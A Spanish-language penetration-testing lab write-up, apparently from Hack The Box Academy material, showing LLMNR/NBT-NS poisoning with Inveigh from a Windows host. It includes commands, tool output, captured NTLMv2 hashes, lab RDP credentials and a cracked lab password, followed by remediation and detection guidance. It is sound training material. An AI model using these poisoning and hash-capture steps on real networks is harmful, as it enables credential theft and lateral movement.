
# LLMNR/NBT-NS Poisoning - Desde Windows

El envenenamiento de LLMNR y NBT-NS también es posible desde un host de Windows. En la última sección, utilizamos Responder para capturar hashes. Esta sección explorará la herramienta [Inveigh](https://github.com/Kevin-Robertson/Inveigh) e intentará capturar otro conjunto de credenciales.

***

## <mark style="color:purple;">Inveigh</mark>

Si terminamos con un host de Windows como nuestro equipo de atacante, nuestro cliente nos proporciona un cuadro de Windows para realizar pruebas, o aterrizamos en un host de Windows como administrador local a través de otro método de ataque y nos gustaría buscar un mayor acceso, la herramienta [Inveigh](https://github.com/Kevin-Robertson/Inveigh) funciona de manera similar a Responder, pero está escrita en PowerShell y C#. Inveigh puede escuchar IPv4 e IPv6 y varios otros protocolos, incluidos `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`,y Proxy Auth. En los siguientes ejemplos la herramienta está disponible en el directorio `C:\Tools` del host de ataque de Windows.

Podemos comenzar con la versión de PowerShell de la siguiente manera y luego enumerar todos los parámetros posibles. Hay una [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) que enumera todos los parámetros e instrucciones de uso.

### Usando Inveigh

```powershell
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
PcapUDP                 System.Management.Automation.ParameterMetadata
SpooferHostsReply       System.Management.Automation.ParameterMetadata
SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
SpooferIPsReply         System.Management.Automation.ParameterMetadata
SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
WPADDirectHosts         System.Management.Automation.ParameterMetadata
WPADAuthIgnore          System.Management.Automation.ParameterMetadata
ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
ConsoleStatus           System.Management.Automation.ParameterMetadata
ADIDNSThreshold         System.Management.Automation.ParameterMetadata
ADIDNSTTL               System.Management.Automation.ParameterMetadata
DNSTTL                  System.Management.Automation.ParameterMetadata
HTTPPort                System.Management.Automation.ParameterMetadata
HTTPSPort               System.Management.Automation.ParameterMetadata
KerberosCount           System.Management.Automation.ParameterMetadata
LLMNRTTL                System.Management.Automation.ParameterMetadata

<SNIP>
```

Comencemos Inveigh con la suplantación de LLMNR y NBNS, la salida a la consola y la escritura en un archivo. Dejaremos el resto de valores predeterminados, que se pueden ver [aquí](https://github.com/Kevin-Robertson/Inveigh#parameter-help) .

```powershell
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Certificate Issuer = Inveigh
[+] HTTPS Certificate CN = localhost
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
WARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener
WARNING: [!] [2022-02-28T19:26:31] Exception calling "Start" with "0" argument(s): "An attempt was made to access a
socket in a way forbidden by its access permissions" $HTTP_listener.Start()
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834

<SNIP>
```

Podemos ver que inmediatamente comenzamos a recibir solicitudes `LLMNR` y `mDNS`. La siguiente animación muestra la herramienta en acción.

![imagen](https://academy.hackthebox.com/storage/modules/143/inveigh_pwsh.png)

***

### C# Inveigh (InveighZero)

La versión PowerShell de Inveigh es la `versión original` y ya no se actualiza. El autor de la herramienta mantiene la versión C#, que combina el código PoC C# original y una adaptación C# de la mayor parte del código de la versión PowerShell. Antes de poder utilizar la versión C# de la herramienta, `debemos compilar el ejecutable`. Para ahorrar tiempo, hemos incluido una copia de PowerShell y de la versión ejecutable compilada de la herramienta en la carpeta `C:\Tools` del host de destino en el laboratorio, pero vale la pena realizar el ejercicio (y las mejores prácticas) de compilarlo tu mismo usando Visual Estudio.

También la puedes encontrar en mi respositorio AD Tools:

{% embed url="<https://github.com/afsh4ck/AD-Tools>" %}

Sigamos adelante y ejecutemos la versión C# con los valores predeterminados y comencemos a capturar hashes.

```powershell
PS C:\htb> .\Inveigh.exe

[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
```

Como podemos ver, la herramienta se inicia y muestra qué opciones están habilitadas por defecto y cuáles no. Las opciones con un `[+]` están habilitadas de forma predeterminada y las que tienen un  `[ ]` antes están deshabilitadas. La salida de la consola en ejecución también nos muestra qué opciones están deshabilitadas y, por lo tanto, no se envían respuestas (mDNS en el ejemplo anterior). También podemos ver el mensaje `Press ESC to enter/exit interactive console`, lo cual es muy útil mientras ejecutamos la herramienta. La consola nos da acceso a credenciales/hashes capturados, nos permite detener Inveigh y más.

Podemos presionar la tecla `esc` para ingresar a la consola mientras Inveigh se está ejecutando.

```powershell
<SNIP>

[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311
C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
```

Después de escribir `HELP` y pulsar enter, se nos presentan varias opciones:

```

=============================================== Inveigh Console Commands ===============================================

Command                           Description
========================================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
GET REPLYTOHOSTS                | get ReplyToHosts parameter startup values
GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
GET IGNOREHOSTS                 | get IgnoreHosts parameter startup values
GET IGNOREIPS                   | get IgnoreIPs parameter startup values
GET IGNOREMACS                  | get IgnoreMACs parameter startup values
SET CONSOLE                     | set Console parameter value
HISTORY                         | get command history
RESUME                          | resume real time console output
STOP                            | stop Inveigh
```

Podemos ver rápidamente hashes capturados únicos escribiendo `GET NTLMV2UNIQUE`.

```powershell-session

================================================= Unique NTLMv2 Hashes =================================================

Hashes
========================================================================================================================
backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000

<SNIP>
```

Podemos escribir `GET NTLMV2USERNAMES` y ver qué nombres de usuario hemos recopilado. Esto es útil si queremos una lista de usuarios para realizar una enumeración adicional y ver cuáles vale la pena intentar descifrar sin conexión usando Hashcat.

```powershell-session

=================================================== NTLMv2 Usernames ===================================================

IP Address                        Host                              Username                          Challenge
========================================================================================================================
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\backupagent       | B5013246091943D7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\forend            | 32FD89BD78804B04
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\clusteragent      | 28BF08D82FA998E4
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\wley              | 277AC2ED022DB4F7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys        | 5F9BB670D23F23ED
```

Comencemos Inveigh y luego interactuemos un poco con la salida para unirlo todo.

![imagen](https://academy.hackthebox.com/storage/modules/143/inveigh_csharp.png)

***

## <mark style="color:purple;">Remediación</mark>

Mitre ATT\&CK enumera esta técnica como ID [: T1557.001](https://attack.mitre.org/techniques/T1557/001) ,`Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`

Hay algunas formas de mitigar este ataque. Para garantizar que estos ataques de suplantación de identidad no sean posibles, podemos `desactivar LLMNR y NBT-NS`. Como advertencia, siempre vale la pena probar lentamente un cambio significativo como este en su entorno antes de implementarlo por completo. Como Pentesters, podemos recomendar estos pasos de solución, pero debemos comunicar claramente a nuestros clientes que deben probar estos cambios exhaustivamente para garantizar que la desactivación de ambos protocolos no rompa nada en la red.

Podemos deshabilitar LLMNR en el `Local Group Management Editor` yendo a `Computer Configuration` -> `Administrative Templates` -> `Network` -> `DNS Client` y habilitando "`Turn off multicast name resolution`".

![imagen](https://academy.hackthebox.com/storage/modules/143/llmnr_disable.png)

`NBT-NS` no se puede deshabilitar a través de la Política de grupo, pero debe deshabilitarse localmente en cada host. Podemos hacer esto abriendo `Network and Sharing Center` debajo `Control Panel`, haciendo clic en `Change adapter settings`, haciendo clic derecho en el adaptador para ver sus propiedades, seleccionando `Internet Protocol Version 4 (TCP/IPv4)`y haciendo clic en el `Properties`botón, luego haciendo clic `Advanced`y seleccionando la `WINS`pestaña y finalmente seleccionando `Disable NetBIOS over TCP/IP`.

![imagen](https://academy.hackthebox.com/storage/modules/143/disable_nbtns.png)

Si bien no es posible deshabilitar NBT-NS directamente a través de GPO, podemos crear un script de PowerShell en `Computer Configuration` -> `Windows Settings` -> `Script (Startup/Shutdown)` -> `Startup` con algo como lo siguiente:

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

En el `Local Group Policy Editor`, necesitaremos hacer doble clic en `Startup`, elegir la pestaña `PowerShell Scripts` y seleccionar "Para este GPO, ejecutar scripts en el siguiente orden" `Run Windows PowerShell scripts first`, y luego hacer clic `Add`y elegir el script. Para que se produzcan estos cambios, tendríamos que reiniciar el sistema de destino o reiniciar el adaptador de red.

![imagen](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo.png)

Para enviar esto a todos los hosts de un dominio, podríamos crear un GPO usando `Group Policy Management` en el controlador de dominio y alojar el script en el recurso compartido `SYSVOL` en la carpeta de scripts y luego llamarlo a través de su ruta UNC, como por ejemplo:

`\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`

Una vez que se aplica el GPO a unidades organizativas específicas y se reinician esos hosts, el script se ejecutará en el siguiente reinicio y deshabilitará `NBT-NS`, siempre que el script todavía exista en el recurso compartido SYSVOL y el host pueda acceder a él a través de la red.

![imagen](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo_dc.png)

Otras mitigaciones incluyen filtrar el tráfico de red para bloquear el tráfico LLMNR/NetBIOS y habilitar la firma SMB para evitar ataques de retransmisión NTLM. Los sistemas de detección y prevención de intrusiones en la red también se pueden usar para mitigar esta actividad, mientras que la segmentación de la red se puede usar para aislar hosts que requieren LLMNR o NetBIOS habilitados para funcionar correctamente.

***

## <mark style="color:purple;">Detección</mark>

No siempre es posible desactivar LLMNR y NetBIOS y, por lo tanto, necesitamos formas de detectar este tipo de comportamiento de ataque. Una forma es utilizar el ataque contra los atacantes inyectando solicitudes LLMNR y NBT-NS para hosts inexistentes en diferentes subredes y alertando si alguna de las respuestas recibe respuestas que serían indicativas de que un atacante está falsificando respuestas de resolución de nombres. Esta [publicación de blog](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explica este método con más profundidad.

Además, se puede monitorear el tráfico de los hosts en los puertos UDP 5355 y 137, y se pueden monitorear los ID de eventos [4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) y [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) . Finalmente, podemos monitorear la clave de registro `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` para detectar cambios en el `EnableMulticast`valor DWORD. Un valor de `0`significaría que LLMNR está deshabilitado.

***

## <mark style="color:purple;">Caso Práctico</mark>

```
RDP a 10.129.134.144 (ACADEMIA-EA-MS01)
Usuario " htb-student "
Contraseña " Academy_student_AD! "
```

Ejecute Inveigh y capture el hash NTLMv2 para la cuenta `svc_qualys`. Crackea y envía la contraseña en texto claro como respuesta.

```powershell
PS C:\htb> Import-Module .\Inveigh.ps1

PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Esto ya empieza el escaneo y nos guarda todos los hashes en el documento `Inveigh-NTLMv2.txt`

```powershell
PS C:\Tools> cat .\Inveigh-NTLMv2.txt
lab_adm::INLANEFREIGHT:BA4E16E1B7ADAFBA:0CE9C1E97317A2B69DF44E8C22F6833D:0101000000000000026985869EC7DA01CCB6FC47EAB55B190000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800026985869EC7DA0106000400020000000800300030000000000000000000000000300000B86882BC6290D1CC42566132E367379C68A649C2EC681B2A345E9B74075B16980A001000000000000000000000000000000000000900280063006900660073002F00610063006100640065006D0079002D00650061002D0077006500620030000000000000000000
forend::INLANEFREIGHT:92490DD928E27C2E:7D48B0094A3039349995B3DE0AAB5B86:0101000000000000B0517B8C9EC7DA01394A45252E815D230000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800B0517B8C9EC7DA0106000400020000000800300030000000000000000000000000300000B86882BC6290D1CC42566132E367379C68A649C2EC681B2A345E9B74075B16980A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
clusteragent::INLANEFREIGHT:E9163918F126D692:BFE556EC1759849F267351F34AC4AA80:0101000000000000DEC023969EC7DA016B4BEE905D5FE8B30000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800DEC023969EC7DA0106000400020000000800300030000000000000000000000000300000B86882BC6290D1CC42566132E367379C68A649C2EC681B2A345E9B74075B16980A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
backupagent::INLANEFREIGHT:913306B0F8743CB6:EFBA8CCF01D645270E3F8FAED02D683B:01010000000000000637F4B59EC7DA01C0CBD79460B67E110000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008000637F4B59EC7DA0106000400020000000800300030000000000000000000000000300000B86882BC6290D1CC42566132E367379C68A649C2EC681B2A345E9B74075B16980A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
svc_qualys::INLANEFREIGHT:D1C2870E3A2BCFC7:F1C7EF5C26F69C263C0EA20C0D2A20FD:0101000000000000F77D27BA9EC7DA01AD60B414DFF7B3AD0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800F77D27BA9EC7DA0106000400020000000800300030000000000000000000000000300000B86882BC6290D1CC42566132E367379C68A649C2EC681B2A345E9B74075B16980A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```

Ahora que tenemos el hash NTLMv2 de `svc_qualys` vamos a crackearlo con John:

<figure><img src="/files/GivsQx3Ec8UNOgo1j0On" alt=""><figcaption></figcaption></figure>

La contraseña en plano de svc\_qualys es: `security#1`

***

## <mark style="color:purple;">Hacia adelante</mark>

Ahora hemos capturado hashes para varias cuentas. En este punto de nuestra evaluación, nos gustaría realizar una enumeración utilizando una herramienta como BloodHound para determinar si vale la pena descifrar alguno o todos estos hashes. Si tenemos suerte y desciframos un hash para una cuenta de usuario con algún acceso o derechos privilegiados, podemos comenzar a ampliar nuestro alcance en el dominio. ¡Incluso podemos tener mucha suerte y descifrar el hash para un usuario administrador de dominio! Si no tuvimos suerte al descifrar hashes o desciframos algunos pero no obtuvimos ningún fruto, entonces quizás la pulverización de contraseñas (que cubriremos en profundidad en las siguientes secciones) sea más exitosa.
